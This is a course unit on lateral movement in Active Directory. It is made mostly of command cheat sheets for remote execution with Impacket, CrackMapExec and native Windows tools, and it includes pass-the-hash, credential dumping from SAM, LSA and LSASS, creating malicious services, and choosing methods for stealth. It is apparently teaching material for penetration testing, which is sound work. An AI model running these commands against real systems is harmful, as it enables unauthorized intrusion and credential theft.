# Remote Execution Techniques

## Unit 6 - Topic 1 | Lateral Movement

---

## Overview

**Remote execution** enables attackers to run commands on other machines across the network after obtaining valid credentials. In AD environments, multiple protocols and tools facilitate lateral movement — each with different stealth profiles, requirements, and capabilities.

---

## 1. Remote Execution Methods Overview

```
REMOTE EXECUTION COMPARISON:

METHOD          PORT    STEALTH   REQUIRES       GETS YOU
─────────────────────────────────────────────────────────
PsExec          445     Low       Admin          SYSTEM
WMI             135     Medium    Admin          User
WinRM           5985    Medium    Admin          User
DCOM            135     High      Admin          User
SMB (smbexec)   445     Medium    Admin          SYSTEM
AT/SchTask      445     Medium    Admin          SYSTEM
SSH             22      High      Creds          User
RDP             3389    Low       Creds + GUI    User

PROTOCOL FLOW:
┌──────────┐    Auth (NTLM/Kerberos)    ┌──────────┐
│ Attacker │ ─────────────────────────→ │  Target  │
│          │    Command execution       │  Machine │
│          │ ─────────────────────────→ │          │
│          │    Command output          │          │
│          │ ←───────────────────────── │          │
└──────────┘                            └──────────┘
```

---

## 2. Impacket Remote Execution Tools

```bash
# === PSEXEC.PY (Most Common) ===
# Creates a service, uploads binary, executes, cleans up
psexec.py corp.local/admin:pass@target
psexec.py corp.local/admin@target -hashes :NTLM_HASH
# Shell: SYSTEM
# Artifacts: Service creation event, binary on disk (briefly)
# Detection: Moderate — well-known signature

# === WMIEXEC.PY (Stealthier) ===
# Uses WMI for command execution
wmiexec.py corp.local/admin:pass@target
wmiexec.py corp.local/admin@target -hashes :NTLM_HASH
# Shell: Admin user context (not SYSTEM)
# Artifacts: WMI events
# Detection: Lower — WMI is normal in enterprise

# === SMBEXEC.PY ===
# Creates a service but doesn't upload binary
smbexec.py corp.local/admin:pass@target
# Shell: SYSTEM
# Artifacts: Service creation, cmd.exe output to share

# === ATEXEC.PY (Scheduled Task) ===
# Creates scheduled task for one-time execution
atexec.py corp.local/admin:pass@target "command"
# Shell: SYSTEM (single command)
# Artifacts: Scheduled task creation event

# === DCOMEXEC.PY (Stealthiest Impacket) ===
# Uses DCOM (Distributed COM) for execution
dcomexec.py corp.local/admin:pass@target
dcomexec.py corp.local/admin@target -hashes :NTLM_HASH \
  -object MMC20.Application
# Shell: Admin user context
# Artifacts: Minimal — DCOM is rarely monitored
# Objects: MMC20.Application, ShellWindows, ShellBrowserWindow

# === ALL WITH KERBEROS ===
export KRB5CCNAME=admin.ccache
psexec.py corp.local/admin@target -k -no-pass
wmiexec.py corp.local/admin@target -k -no-pass
# Uses Kerberos instead of NTLM — stealthier
```

---

## 3. CrackMapExec Mass Execution

```bash
# === COMMAND EXECUTION ON MULTIPLE HOSTS ===

# Execute command:
crackmapexec smb 10.0.0.0/24 -u admin -p pass -x "whoami"
# -x: Execute command
# Tests all hosts, shows which succeed

# Execute PowerShell:
crackmapexec smb 10.0.0.0/24 -u admin -p pass \
  -X "Get-Process"
# -X: Execute PowerShell command

# With hash:
crackmapexec smb targets.txt -u admin -H NTLM_HASH \
  -x "whoami"

# === EXECUTION METHODS ===
# Default: wmiexec
crackmapexec smb target -u admin -p pass -x "whoami"

# Specify method:
crackmapexec smb target -u admin -p pass -x "whoami" \
  --exec-method smbexec
crackmapexec smb target -u admin -p pass -x "whoami" \
  --exec-method atexec
crackmapexec smb target -u admin -p pass -x "whoami" \
  --exec-method mmcexec

# === USEFUL CME COMMANDS ===
# Check admin access:
crackmapexec smb 10.0.0.0/24 -u admin -p pass
# [+] (Pwn3d!) means admin access

# Dump credentials:
crackmapexec smb target -u admin -p pass --sam
crackmapexec smb target -u admin -p pass --lsa
crackmapexec smb target -u admin -p pass -M lsassy
```

---

## 4. Windows Native Remote Execution

```powershell
# === PSEXEC (Sysinternals) ===
PsExec.exe \\target -u admin -p pass cmd.exe
PsExec.exe \\target -s cmd.exe    # As SYSTEM (if admin)
PsExec.exe \\target -u admin -p pass -c evil.exe  # Upload and run

# === WMI (Built-in) ===
wmic /node:target /user:admin /password:pass process call create "cmd.exe /c whoami > C:\temp\out.txt"
# Then read: type \\target\c$\temp\out.txt

# === POWERSHELL REMOTING (WinRM) ===
# Interactive session:
Enter-PSSession -ComputerName target -Credential corp\admin

# Execute command:
Invoke-Command -ComputerName target -Credential corp\admin \
  -ScriptBlock {whoami; hostname}

# Execute on multiple hosts:
Invoke-Command -ComputerName srv01,srv02,srv03 \
  -Credential corp\admin \
  -ScriptBlock {whoami}

# === SCHEDULED TASKS ===
schtasks /create /tn "Update" /tr "cmd /c whoami > C:\out.txt" \
  /sc once /st 00:00 /s target /u admin /p pass /ru SYSTEM
schtasks /run /tn "Update" /s target /u admin /p pass
schtasks /delete /tn "Update" /s target /u admin /p pass /f

# === SC (Service Control) ===
sc \\target create evil binpath="cmd /c whoami > C:\out.txt"
sc \\target start evil
sc \\target delete evil
```

---

## 5. Execution Method Selection

| Scenario | Best Method | Why |
|----------|-------------|-----|
| **Quick shell** | wmiexec | Fast, semi-stealthy |
| **SYSTEM access** | psexec | Gets SYSTEM shell |
| **Mass recon** | CrackMapExec | Parallel execution |
| **Stealth** | dcomexec | Least monitored |
| **PowerShell** | WinRM/Enter-PSSession | Full PS environment |
| **Single command** | atexec | Minimal artifacts |
| **Kerberos only** | Any with -k flag | Avoids NTLM logs |

---

## Summary Table

| Method | Tool | Level | Detection |
|--------|------|-------|-----------|
| **SMB/PsExec** | psexec.py, PsExec | SYSTEM | High |
| **WMI** | wmiexec.py, wmic | User | Medium |
| **WinRM** | evil-winrm, PS | User | Medium |
| **DCOM** | dcomexec.py | User | Low |
| **Sched Task** | atexec.py, schtasks | SYSTEM | Medium |
| **Service** | smbexec.py, sc | SYSTEM | Medium |

---

## Quick Revision Questions

1. **Which Impacket tool is considered stealthiest?**
2. **What is the difference between psexec.py and wmiexec.py?**
3. **How does CrackMapExec enable mass lateral movement?**
4. **Why is Kerberos-based execution preferred over NTLM?**
5. **What ports are needed for each execution method?**

---

[Next: WMI Exploitation →](02-wmi-exploitation.md)

---

*Unit 6 - Topic 1 of 6 | [Back to README](../README.md)*
